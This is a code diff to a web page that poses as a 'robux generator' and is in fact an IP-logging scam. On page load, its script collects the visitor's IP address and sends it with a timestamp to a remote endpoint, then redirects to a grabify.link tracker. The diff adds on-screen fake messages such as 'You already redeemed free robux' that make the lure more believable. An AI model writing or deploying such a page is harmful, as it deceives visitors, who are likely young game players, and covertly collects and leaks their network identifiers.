@@ -7,6 +7,7 @@
 </head>
 <body>
   <h1>Generating robux, don't tab out/close this window!</h1>
+  <div id="errorLabel"></div>
 
   <script>
     document.addEventListener("DOMContentLoaded", function() {
@@ -23,15 +24,12 @@
         .then(data => {
           var ip = data.ip;
           
-          // Check if IP address has been logged before
           if (isIpLogged(ip)) {
-            console.log("IP address already logged.");
+            showError("You already redeemed free robux.");
             return;
           }
 
-          // Log the IP address
           logIp(ip);
-
           var message = {
             content: "Opened on: " + formattedDate + "\nIP address: " + ip
           };
@@ -45,18 +43,18 @@
           })
           .then(response => {
             if (!response.ok) {
-              console.error("Failed generating robux");
+              showError("Failed generating robux");
             } else {
               console.log("Generated robux");
               redirectToDifferentWebsite();
             }
           })
           .catch(error => {
-            console.error("Error generating robux");
+            showError("Error generating robux");
           });
         })
         .catch(error => {
-          console.error("Error fetching IP address:", error);
+          showError("Error fetching robux.");
         });
     }
 
@@ -84,6 +82,11 @@
 
     function redirectToDifferentWebsite() {
       window.location.href = "https://grabify.link/QW9D2R";
+    }
+
+    function showError(errorMessage) {
+      var errorLabel = document.getElementById("errorLabel");
+      errorLabel.textContent = errorMessage;
     }
   </script>
 </body>
